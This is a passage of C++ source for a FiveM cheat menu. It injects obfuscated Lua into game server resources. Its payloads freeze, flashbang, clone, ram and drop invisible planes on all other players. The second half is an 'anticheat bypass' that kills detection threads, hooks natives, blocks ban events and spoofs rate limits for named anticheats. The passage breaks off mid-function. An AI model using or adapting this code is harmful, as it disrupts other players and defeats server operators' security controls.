            hasRun = false
        end)
    else
        isSpawning = false
        hasRun = false
    end
end

Citizen.CreateThread(function()
    SpawnPedsAtPlayer2()
end)
                )lua";
            }
            else if (actionName == "Drop Planes On All Players") {
                code = R"lua(
                    local function SafeWrap(setFunc)
                        return function(...)
                            return setFunc(...)
                        end
                    end

                    local SafeThread = SafeWrap(CreateThread)
                    local SafeCVehicle = SafeWrap(CreateVehicle)

                    SafeThread(function()
                        local planeHash = GetHashKey("luxor")
                        RequestModel(planeHash)
                        while not HasModelLoaded(planeHash) do
                            Wait(0)
                        end

                        for _, playerId in ipairs(GetActivePlayers()) do
                            if playerId ~= PlayerId() then
                                local targetPed = GetPlayerPed(playerId)
                                if DoesEntityExist(targetPed) then
                                    local coords = GetEntityCoords(targetPed)
                                    local plane = SafeCVehicle(planeHash, coords.x, coords.y, coords.z + 50.0, 0.0, true, false)
                                    if DoesEntityExist(plane) then
                                        SetEntityAsMissionEntity(plane, true, true)
                                        SetEntityInvincible(plane, false)
                                        SetEntityVisible(plane, false, false)
                                        SetEntityAlpha(plane, 0, false)
                                        if not DecorIsRegisteredAsType("whitelisted", 2) then
                                            pcall(function() DecorRegister("whitelisted", 2) end)
                                        end
                                        DecorSetBool(plane, "whitelisted", true)
                                    end
                                end
                            end
                        end
                        SetModelAsNoLongerNeeded(planeHash)
                    end)
                )lua";
            }
            else if (actionName == "Heal All Players") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local myPed = _g({80,108,97,121,101,114,80,101,100,73,100})()
                    local myCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(myPed)
                    local players = _g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
                    local model = "xm_prop_x17_med_bag_01a"
                    _g({82,101,113,117,101,115,116,77,111,100,101,108})(model)
                    while not _g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(model) do _g({87,97,105,116})(0) end

                    for _, playerId in ipairs(players) do
                        if playerId ~= _g({80,108,97,121,101,114,73,100})() then
                            local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(playerId)
                            if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                                local targetCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(targetPed)
                                local dist = #(myCoords - targetCoords)
                                if dist < 50.0 then
                                    local obj = _g({67,114,101,97,116,101,79,98,106,101,99,116,78,111,79,102,102,115,101,116})(model, targetCoords.x, targetCoords.y, targetCoords.z, true, true, false)
                                    if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(obj) then
                                        _g({78,101,116,119,111,114,107,82,101,103,105,115,116,101,114,69,110,116,105,116,121,65,115,78,101,116,119,111,114,107,101,100})(obj)
                                        local netId = _g({79,98,106,84,111,78,101,116})(obj)
                                        _g({83,101,116,78,101,116,119,111,114,107,73,100,69,120,105,115,116,115,79,110,65,108,108,77,97,99,104,105,110,101,115})(netId, true)
                                        _g({83,101,116,78,101,116,119,111,114,107,73,100,67,97,110,77,105,103,114,97,116,101})(netId, true)
                                        _g({80,108,97,99,101,79,98,106,101,99,116,79,110,71,114,111,117,110,100,80,114,111,112,101,114,108,121})(obj)
                                        _g({83,101,116,69,110,116,105,116,121,72,101,97,108,116,104})(targetPed, _g({71,101,116,69,110,116,105,116,121,77,97,120,72,101,97,108,116,104})(targetPed))
                                        _g({87,97,105,116})(500)
                                        _g({68,101,108,101,116,101,79,98,106,101,99,116})(obj)
                                    end
                                end
                            end
                        end
                    end
                    _g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(model)
                )lua";
            }
            else if (actionName == "Give Armour to All Players") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local myPed = _g({80,108,97,121,101,114,80,101,100,73,100})()
                    local myCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(myPed)
                    local players = _g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
                    local model = "prop_armour_pickup"
                    _g({82,101,113,117,101,115,116,77,111,100,101,108})(model)
                    while not _g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(model) do _g({87,97,105,116})(0) end

                    for _, playerId in ipairs(players) do
                        if playerId ~= _g({80,108,97,121,101,114,73,100})() then
                            local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(playerId)
                            if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                                local targetCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(targetPed)
                                local dist = #(myCoords - targetCoords)
                                if dist < 50.0 then
                                    local obj = _g({67,114,101,97,116,101,79,98,106,101,99,116,78,111,79,102,102,115,101,116})(model, targetCoords.x, targetCoords.y, targetCoords.z, true, true, false)
                                    if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(obj) then
                                        _g({78,101,116,119,111,114,107,82,101,103,105,115,116,101,114,69,110,116,105,116,121,65,115,78,101,116,119,111,114,107,101,100})(obj)
                                        local netId = _g({79,98,106,84,111,78,101,116})(obj)
                                        _g({83,101,116,78,101,116,119,111,114,107,73,100,69,120,105,115,116,115,79,110,65,108,108,77,97,99,104,105,110,101,115})(netId, true)
                                        _g({83,101,116,78,101,116,119,111,114,107,73,100,67,97,110,77,105,103,114,97,116,101})(netId, true)
                                        _g({80,108,97,99,101,79,98,106,101,99,116,79,110,71,114,111,117,110,100,80,114,111,112,101,114,108,121})(obj)
                                        _g({83,101,116,80,101,100,65,114,109,111,117,114})(targetPed, 100)
                                        _g({87,97,105,116})(500)
                                        _g({68,101,108,101,116,101,79,98,106,101,99,116})(obj)
                                    end
                                end
                            end
                        end
                    end
                    _g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(model)
                )lua";
            }
            else if (actionName == "Give Weapons to All Players") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local myPed = _g({80,108,97,121,101,114,80,101,100,73,100})()
                    local myCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(myPed)
                    local players = _g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
                    local weapons = {
                        "WEAPON_PISTOL", "WEAPON_COMBATPISTOL", "WEAPON_SMG", "WEAPON_CARBINERIFLE"
                    }

                    for _, playerId in ipairs(players) do
                        if playerId ~= _g({80,108,97,121,101,114,73,100})() then
                            local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(playerId)
                            if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                                local targetCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(targetPed)
                                local dist = #(myCoords - targetCoords)
                                if dist < 50.0 then
                                    for _, weapon in ipairs(weapons) do
                                        _g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})(targetPed, _g({71,101,116,72,97,115,104,75,101,121})(weapon), 250, false, false)
                                    end
                                end
                            end
                        end
                    end
                )lua";
            }
            else if (actionName == "Freeze All Players") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local myPed = _g({80,108,97,121,101,114,80,101,100,73,100})()
                    local myCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(myPed)
                    local players = _g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()

                    for _, playerId in ipairs(players) do
                        if playerId ~= _g({80,108,97,121,101,114,73,100})() then
                            local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(playerId)
                            if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                                local targetCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(targetPed)
                                local dist = #(myCoords - targetCoords)
                                if dist < 50.0 then
                                    _g({70,114,101,101,122,101,69,110,116,105,116,121,80,111,115,105,116,105,111,110})(targetPed, true)
                                end
                            end
                        end
                    end
                )lua";
            }
            else if (actionName == "Clone All Players") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local myPed = _g({80,108,97,121,101,114,80,101,100,73,100})()
                    local myCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(myPed)
                    local players = _g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()

                    for _, playerId in ipairs(players) do
                        if playerId ~= _g({80,108,97,121,101,114,73,100})() then
                            local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(playerId)
                            if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                                local targetCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(targetPed)
                                local dist = #(myCoords - targetCoords)
                                if dist < 50.0 then
                                    local model = _g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(targetPed)
                                    _g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                                        _g({82,101,113,117,101,115,116,77,111,100,101,108})(model)
                                        while not _g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(model) do _g({87,97,105,116})(0) end
                                        local clone = _g({67,114,101,97,116,101,80,101,100})(26, model, targetCoords.x + 1.0, targetCoords.y, targetCoords.z, 0.0, true, true)
                                        _g({83,101,116,80,101,100,67,108,111,110,101})(clone, targetPed)
                                        _g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(model)
                                    end)
                                end
                            end
                        end
                    end
                )lua";
            }
            else if (actionName == "Talk to All Players") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local enabled = true
                    if enabled then
                        if not _G.SouthVoiceLoop then _G.SouthVoiceLoop = false end
                        _G.SouthVoiceLoop = true
                        _g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                            while _G.SouthVoiceLoop do
                                _g({67,105,116,105,122,101,110,46,87,97,105,116})(250)
                                _g({77,117,109,98,108,101,83,101,116,84,97,108,107,101,114,80,114,111,120,105,109,105,116,121})(8683.0)
                                _g({78,101,116,119,111,114,107,83,101,116,86,111,105,99,101,65,99,116,105,118,101})(true)
                                _g({78,101,116,119,111,114,107,83,101,116,84,97,108,107,101,114,80,114,111,120,105,109,105,116,121})(8683.0)
                                _g({78,101,116,119,111,114,107,83,101,116,86,111,105,99,101,65,99,116,105,118,101})(true)
                            end
                        end)
                    else
                        _G.SouthVoiceLoop = false
                    end
                )lua";
            }
            else if (actionName == "Flash Bang All Players") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    if not _G.SouthFlashbangAll then _G.SouthFlashbangAll = false end
                    
                    if _G.SouthFlashbangAll then
                        _G.SouthFlashbangAll = false
                    else
                        _G.SouthFlashbangAll = true
                        local _citizen = _G[_d({67,105,116,105,122,101,110})]
                        _citizen[_d({67,114,101,97,116,101,84,104,114,101,97,100})](function()
                            while _G.SouthFlashbangAll do
                                local myPed = _g({80,108,97,121,101,114,80,101,100,73,100})()
                                local myCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(myPed)
                                local players = _g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()

                                for _, playerId in ipairs(players) do
                                    if playerId ~= _g({80,108,97,121,101,114,73,100})() then
                                        local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(playerId)
                                        if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                                            local targetCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(targetPed)
                                            local dist = #(myCoords - targetCoords)
                                            if dist < 150.0 then
                                                _g({82,101,113,117,101,115,116,78,97,109,101,100,80,116,102,120,65,115,115,101,116})("scr_sr_tr")
                                                local t = 0
                                                while not _g({72,97,115,78,97,109,101,100,80,116,102,120,65,115,115,101,116,76,111,97,100,101,100})("scr_sr_tr") and t < 20 do
                                                    _citizen[_d({87,97,105,116})](5)
                                                    t = t + 1
                                                end
                                                if _g({72,97,115,78,97,109,101,100,80,116,102,120,65,115,115,101,116,76,111,97,100,101,100})("scr_sr_tr") then
                                                    _g({85,115,101,80,97,114,116,105,99,108,101,70,120,65,115,115,101,116,78,101,120,116,67,97,108,108})("scr_sr_tr")
                                                    _g({83,101,116,80,97,114,116,105,99,108,101,70,120,78,111,110,76,111,111,112,101,100,67,111,108,111,117,114})(1.0, 1.0, 1.0)
                                                    _g({83,101,116,80,97,114,116,105,99,108,101,70,120,78,111,110,76,111,111,112,101,100,65,108,112,104,97})(1.0)
                                                    _g({83,116,97,114,116,78,101,116,119,111,114,107,101,100,80,97,114,116,105,99,108,101,70,120,78,111,110,76,111,111,112,101,100,65,116,67,111,111,114,100})(
                                                        "scr_sr_tr_car_change",
                                                        targetCoords.x, targetCoords.y, targetCoords.z,
                                                        0.0, 0.0, 0.0,
                                                        2.0,
                                                        false, false, false
                                                    )
                                                end
                                            end
                                        end
                                    end
                                end
                                _citizen[_d({87,97,105,116})](200)
                            end
                        end)
                    end
                )lua";
            }
            else if (actionName == "Ram All Players With Vehicle") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local myPed = _g({80,108,97,121,101,114,80,101,100,73,100})()
                    local myCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(myPed)
                    local players = _g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()

                    local _citizen = _G[_d({67,105,116,105,122,101,110})]
                    _citizen[_d({67,114,101,97,116,101,84,104,114,101,97,100})](function()
                        for _, playerId in ipairs(players) do
                            if playerId ~= _g({80,108,97,121,101,114,73,100})() then
                                local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(playerId)
                                if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                                    local tCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(targetPed)
                                    local dist = #(myCoords - tCoords)
                                    if dist < 150.0 then
                                        local forward = _g({71,101,116,69,110,116,105,116,121,70,111,114,119,97,114,100,86,101,99,116,105,118,101})(targetPed)

                                        local spawnDist = 25.0
                                        local spawnX = tCoords.x + (forward.x * spawnDist)
                                        local spawnY = tCoords.y + (forward.y * spawnDist)
                                        local spawnZ = tCoords.z

                                        local dx = tCoords.x - spawnX
                                        local dy = tCoords.y - spawnY

                                        local targetHeading = math.deg(math.atan(dy, dx)) - 90.0
                                        local magnitude = math.sqrt(dx * dx + dy * dy)
                                        local speed = 100.0
                                        local forceX = (dx / magnitude) * speed
                                        local forceY = (dy / magnitude) * speed
                                        local forceZ = -0.2

                                        local modelHash = _g({71,101,116,72,97,115,104,75,101,121})('sultan')
                                        _g({82,101,113,117,101,115,116,77,111,100,101,108})(modelHash)
                                        local t = 0
                                        while not _g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) and t < 20 do _citizen[_d({87,97,105,116})](5) t=t+1 end

                                        if _g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) then
                                            local vehicle = _g({67,114,101,97,116,101,86,101,104,105,99,108,101})(modelHash, spawnX, spawnY, spawnZ, targetHeading, true, true)
                                            if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(vehicle) then
                                                local netId = _g({78,101,116,119,111,114,107,71,101,116,78,101,116,119,111,114,107,73,100,70,114,111,109,69,110,116,105,116,121})(vehicle)
                                                _g({83,101,116,78,101,116,119,111,114,107,73,100,69,120,105,115,116,115,79,110,65,108,108,77,97,99,104,105,110,101,115})(netId, true)
                                                _g({83,101,116,78,101,116,119,111,114,107,73,100,67,97,110,77,105,103,114,97,116,101})(netId, true)
                                                _g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,101,116,69,110,116,105,116,121})(vehicle, true, true)
                                                _g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(vehicle, true)
                                                _g({83,101,116,86,101,104,105,99,108,101,68,97,109,97,103,101,77,111,100,105,102,105,101,114})(vehicle, 0.0)
                                                _g({83,101,116,86,101,104,105,99,108,101,69,110,103,105,110,101,67,97,110,68,101,103,114,97,100,101})(vehicle, false)
                                                _g({83,101,116,86,101,104,105,99,108,101,84,121,114,101,115,67,97,110,66,117,114,115,116})(vehicle, false)
                                                _g({83,101,116,86,101,104,105,99,108,101,67,97,110,66,114,101,97,107})(vehicle, false)
                                                _g({83,101,116,86,101,104,105,99,108,101,67,97,110,66,101,86,105,115,105,98,108,121,68,97,109,97,103,101,100})(vehicle, false)
                                                _g({83,101,116,86,101,104,105,99,108,101,69,120,112,108,111,100,101,115,79,110,72,105,103,104,69,120,112,108,111,115,105,111,110,68,97,109,97,103,101})(vehicle, false)

                                                _g({83,101,116,86,101,104,105,99,108,101,69,110,103,105,110,101,79,110})(vehicle, true, true, false)
                                                _g({83,101,116,86,101,104,105,99,108,101,70,111,114,119,97,114,100,83,112,101,101,100})(vehicle, speed)
                                                _g({83,101,116,69,110,116,105,116,121,86,101,108,111,99,105,116,121})(vehicle, forceX, forceY, forceZ)
                                                _g({83,101,116,86,101,104,105,99,108,101,71,114,97,118,105,116,121})(vehicle, true)
                                                _g({83,101,116,86,101,104,105,99,108,101,69,110,103,105,110,101,80,111,119,101,114,77,117,108,116,105,112,108,105,101,114})(vehicle, 300.0)

                                                _g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(modelHash)
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end)
                )lua";
            }

            if (!code.empty()) {
                std::string fullCode = "local isWS = " + std::string(isWS ? "true" : "false") + "\n" + code;
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + fullCode + "]])", resources);
            }
        } catch (...) {}
    }

    static void UpdateSignals() {}
    static void InitializeProxy() {
        try {
            std::string scriptContent = R"rawlua(-- ========== ENHANCED ANTICHEAT BYPASS SYSTEM (UPDATED) ==========
do
    local anticheat = {
        FiveGuard = "FiveGuard",
        ElectronAC = "ElectronAC",
        WaveShield = "WaveShield",
        EagleAC = "EC_AC",
        ReaperV4 = "ReaperV4",
        ReasonAC = "RAC",
        EulenAC = "Eulen",
        VexAC = "VexAC",
        XyberAC = "XyberAC"
    }

    local function inject_bypass(resource, code)
        if GetResourceState(resource) == "started" then
            if MachoInjectResource then
                MachoInjectResource(resource, code)
                return true
            end
        end
        return false
    end

    -- FiveGuard Bypass (Enhanced)
    local fiveguard_code = [[
        local f = function() end
        local t = function() return true end
        local g = _G
        local s = string

        -- Block detection natives
        local natives = {
            Citizen.InvokeNative(0x3A87E44BB9A01D54), -- GetSelectedPedWeapon
            Citizen.InvokeNative(0x8DECB02F88F428BC), -- HasPedGotWeapon
            Citizen.InvokeNative(0x015A522136D7F951), -- GetAmmoInPedWeapon
            Citizen.InvokeNative(0xA38DCFFCE89696FA), -- GetWeaponClipSize
            Citizen.InvokeNative(0x475768A975D5AD17), -- GetMaxAmmo
            0x4FAFF4BCB7633475,  -- GiveWeaponToPed
            0x7022BD828FA0B082,  -- SetCurrentPedWeapon
            0x6C188BE134E074AA    -- RemoveWeaponFromPed
        }

        local invoke = Citizen.InvokeNative
        Citizen.InvokeNative = function(native, ...)
            for _, n in ipairs(natives) do
                if native == n then return f end
            end
            return invoke(native, ...)
        end

        -- Block events
        local evs = { "FiveGuard:detection", "FiveGuard:ban", "FiveGuard:kick", "FiveGuard:check", "FG:scan" }
        for _, ev in ipairs(evs) do
            if g.AddEventHandler then g.AddEventHandler(ev, f) end
            if g.RegisterNetEvent then g.RegisterNetEvent(ev) end
        end

        -- Kill threads
        local thr = debug.getregistry()._threads
        if thr then
            for i = #thr, 1, -1 do
                local co = thr[i]
                local info = debug.getinfo(co)
                if info and info.source and s.find(info.source, "FiveGuard") then
                    coroutine.close(co)
                end
            end
        end

        -- Remove globals
        local vars = { "FiveGuard", "FG_AC", "FiveGuardStart", "FG_Detect" }
        for _, v in ipairs(vars) do
            g[v] = nil
        end
    ]]

    -- ElectronAC Bypass (Enhanced)
    local electron_code = [[
        local g = _G
        local s = string
        local t = function() return true end
        local n = function() end

        -- Kill all Electron threads
        local registry = debug.getregistry()
        local threads = registry._threads
        if threads then
            for i = #threads, 1, -1 do
                local co = threads[i]
                local info = debug.getinfo(co)
                if info and info.source and (s.find(info.source, "Electron") or s.find(info.source, "AC")) then
                    coroutine.close(co)
                end
            end
        end

        -- Wipe event handlers
        local handlers = registry._eventHandlers
        if handlers then
            for ev, tbl in pairs(handlers) do
                if type(tbl) == "table" and (s.find(ev, "Electron") or s.find(ev, "AC")) then
                    for i = #tbl, 1, -1 do
                        table.remove(tbl, i)
                    end
                end
            end
        end

        -- Block event functions
        g.TriggerEvent = function(e, ...)
            if type(e) == "string" and (s.find(e, "Electron") or s.find(e, "AC") or s.find(e, "detect")) then
                return
            end
            return g.TriggerEvent(e, ...)
        end

        g.TriggerServerEvent = function(e, ...)
            if type(e) == "string" and (s.find(e, "Electron") or s.find(e, "AC") or s.find(e, "ban")) then
                return
            end
            return g.TriggerServerEvent(e, ...)
        end

        g.RegisterNetEvent = function(e)
            if type(e) == "string" and (s.find(e, "Electron") or s.find(e, "AC")) then
                return n
            end
            return g.RegisterNetEvent(e)
        end

        -- Block detection natives
        local detection_natives = {
            0x3A87E44BB9A01D54, 0x8DECB02F88F428BC, 0x015A522136D7F951,
            0xA38DCFFCE89696FA, 0x475768A975D5AD17, 0xF25DF915FA38C5F3,
            0x4899CB088EDF3BCC, 0x0A6DB4965674D243, 0xC3287EE3050FB74C,
            0x8483E98E8B888A2D, 0x4FAFF4BCB7633475
        }

        local invoke = Citizen.InvokeNative
        Citizen.InvokeNative = function(hash, ...)
            for _, native in ipairs(detection_natives) do
                if hash == native then return false end
            end
            return invoke(hash, ...)
        end

        -- Clean state bag
        local state = LocalPlayer.state
        for k, v in pairs(state) do
            if type(v) == "function" and (s.find(k, "electron") or s.find(k, "ac")) then
                state[k] = n
            end
        end

        -- Remove globals
        local bad = { "ElectronAC", "Electron", "AC_Start", "AC_Detect", "ElectronDetect", "EAC" }
        for _, name in ipairs(bad) do
            g[name] = nil
        end
    ]]

    -- WaveShield Bypass (Enhanced)
    local waveshield_code = [[
        local g = _G
        local s = string

        -- Kill WaveShield threads
        local thr = debug.getregistry()._threads
        if thr then
            for i = #thr, 1, -1 do
                local co = thr[i]
                local info = debug.getinfo(co)
                if info and info.source and (s.find(info.source, "WaveShield") or s.find(info.source, "ws")) then
                    coroutine.close(co)
                end
            end
        end

        local n = function() end

        -- Block events
        g.TriggerEvent = function(e, ...)
            if type(e) == "string" and (e:find("WaveShield") or e:find("WS_") or e:find("shield") or e:find("detection")) then
                return
            end
            return g.TriggerEvent(e, ...)
        end

        g.TriggerServerEvent = function(e, ...)
            if type(e) == "string" and (e:find("WaveShield") or e:find("WS_") or e:find("shield")) then
                return
            end
            return g.TriggerServerEvent(e, ...)
        end

        -- Clean event handlers
        local regs = debug.getregistry()._eventHandlers
        if regs then
            for ev, handlers in pairs(regs) do
                if type(handlers) == "table" then
                    for i = #handlers, 1, -1 do
                        local h = handlers[i]
                        if type(h) == "function" then
                            local info = debug.getinfo(h)
                            if info and info.source and (s.find(info.source, "WaveShield") or s.find(info.source, "ws")) then
                                table.remove(handlers, i)
                            end
                        end
                    end
                end
            end
        end

        -- Spoof CIST functions
        if g.CIST then
            g.CIST.canISpawn = function() return true, "SUCCESS" end
            g.CIST.getSpawnDelay = function() return 0 end
            g.CIST.getTimeUntilNextSpawn = function() return 0 end
            g.CIST.RATELIMITES = { Object = math.huge, Ped = math.huge, Vehicle = math.huge }
        end

        -- Block detection natives
        local blocked_natives = {
            0x3A87E44BB9A01D54, 0x8DECB02F88F428BC, 0x015A522136D7F951,
            0xA38DCFFCE89696FA, 0x475768A975D5AD17, 0xF25DF915FA38C5F3,
            0x4899CB088EDF3BCC, 0x0CF2B696BBF945AE, 0x9D9AEBE93C61FDBD
        }

        local invoke = Citizen.InvokeNative
        Citizen.InvokeNative = function(h, ...)
            for _, native in ipairs(blocked_natives) do
                if h == native then return false end
            end
            -- Inject custom native behaviors for bypass
            if h == 0xB15162CB5826E9E8 then -- IsCinematicCamRendering()
                return false, true
            elseif h == 0xE659E47AF827484B then -- IsEntityOnScreen()
                return false, true
            elseif h == 0x9F47B058362C84B5 then -- GetEntityModel()
                return false, 0
            elseif h == 0x53E8CB4F48BFE623 then -- IsPedClimbing()
                local entity = ...
                if entity and IsPedInAnyVehicle(entity, false) then
                    return false, false
                end
                return false, true
            elseif h == 0x12534C348C6CB68B then -- IsPedAPlayer()
                local ped = ...
                local myPed = PlayerPedId()
                local attachedTo = GetEntityAttachedTo(myPed)
                if attachedTo and ped == attachedTo then
                    return false, true
                end
                return true
            elseif h == 0x48C2BED9180FE123 then -- GetEntityAttachedTo()
                local entity = ...
                local myPed = PlayerPedId()
                if entity == myPed then
                    local realAttached = GetEntityAttachedTo(entity)
                    if realAttached == myPed then
                        return false, 0
                    end
                end
                return true
            end
            return invoke(h, ...)
        end
        
        -- Also try registering them to MachoHookNative if available
        local _hook = _G.MachoHookNative or (_ENV and _ENV.MachoHookNative)
        if _hook then
            pcall(function()
                _hook(0xB15162CB5826E9E8, function() return false, true end)
                _hook(0xE659E47AF827484B, function() return false, true end)
                _hook(0x9F47B058362C84B5, function() return false, 0 end)
                _hook(0x53E8CB4F48BFE623, function(entity)
                    if IsPedInAnyVehicle(entity, false) then return false, false end
                    return false, true
                end)
                _hook(0x12534C348C6CB68B, function(ped)
                    local myPed = PlayerPedId()
                    local attachedTo = GetEntityAttachedTo(myPed)
                    if attachedTo and ped == attachedTo then return false, true end
                    return true
                end)
                _hook(0x48C2BED9180FE123, function(entity)
                    local myPed = PlayerPedId()
                    if entity == myPed then
                        local realAttached = GetEntityAttachedTo(entity)
                        if realAttached == myPed then return false, 0 end
                    end
                    return true
                end)
            end)
        end

        -- Remove globals
        local vars = { "WaveShield", "WS", "AntiCheat", "AC_Start", "AC_Check", "ShieldDetect", "WaveShieldAC" }
        for _, v in ipairs(vars) do
            g[v] = nil
        end
    ]]

    -- EagleAC Bypass (Enhanced)
    local eagle_code = [[
        local n = function() end
        local t = function() return true end
        local g = _G

        -- Nullify detection functions
        if g.ECDetect then g.ECDetect = n end
        if g.ECDetectLoader then g.ECDetectLoader = n end
        if g.HasPerm then g.HasPerm = t end
        if g.isUser then g.isUser = t end

        -- Override overwrite functions
        if g.overWrite then
            for k, v in pairs(g.overWrite) do
                if type(v) == "function" then
                    g.overWrite[k] = n
                end
            end
        end

        -- Block events
        g.TriggerEvent = function(e, ...)
            if type(e) == "string" and (e:find("EC_") or e:find("Eagle") or e:find("detect")) then
                return
            end
            return g.TriggerEvent(e, ...)
        end

        g.TriggerServerEvent = function(e, ...)
            if type(e) == "string" and (e:find("EC_") or e:find("Eagle") or e:find("ban")) then
                return
            end
            return g.TriggerServerEvent(e, ...)
        end

        -- Clean state bag
        local bag = LocalPlayer.state
        for k, v in pairs(bag) do
            if type(v) == "function" and (k:find("eagle") or k:find("EC")) then
                bag[k] = n
            end
        end

        -- Block detection natives
        local detection_natives = {
            0x3A87E44BB9A01D54, 0x8DECB02F88F428BC, 0x015A522136D7F951,
            0xA38DCFFCE89696FA, 0x475768A975D5AD17, 0x4FAFF4BCB7633475
        }

        local invoke = Citizen.InvokeNative
        Citizen.InvokeNative = function(h, ...)
            for _, native in ipairs(detection_natives) do
                if h == native then return false end
            end
            return invoke(h, ...)
        end

        -- Kill threads
        local thr = debug.getregistry()._threads
        if thr then
            for i = #thr, 1, -1 do
                local co = thr[i]
                local info = debug.getinfo(co)
                if info and info.source and (info.source:find("EC_AC") or info.source:find("Eagle")) then
                    coroutine.close(co)
                end
            end
        end
    ]]

    -- ReaperV4 Bypass (Enhanced)
    local reaper_code = [[
        local n = function() end
        local t = function() return true end
        local g = _G

        -- Block events
        g.TriggerEvent = function(e, ...)
            if type(e) == "string" and (e:find("Reaper") or e:find("reaper") or e:find("detection")) then
                return
            end
            return g.TriggerEvent(e, ...)
        end

        g.TriggerServerEvent = function(e, ...)
            if type(e) == "string" and (e:find("Reaper") or e:find("reaper") or e:find("ban")) then
                return
            end
            return g.TriggerServerEvent(e, ...)
        end

        -- Block detection natives
        local blocked_natives = {
            0x3A87E44BB9A01D54, 0x8DECB02F88F428BC, 0x0A6DB4965674D243,
            0x475768A975D5AD17, 0xF25DF915FA38C5F3, 0x4899CB088EDF3BCC,
            0x4FAFF4BCB7633475, 0x7022BD828FA0B082
        }

        local invoke = Citizen.InvokeNative
        Citizen.InvokeNative = function(h, ...)
            for _, native in ipairs(blocked_natives) do
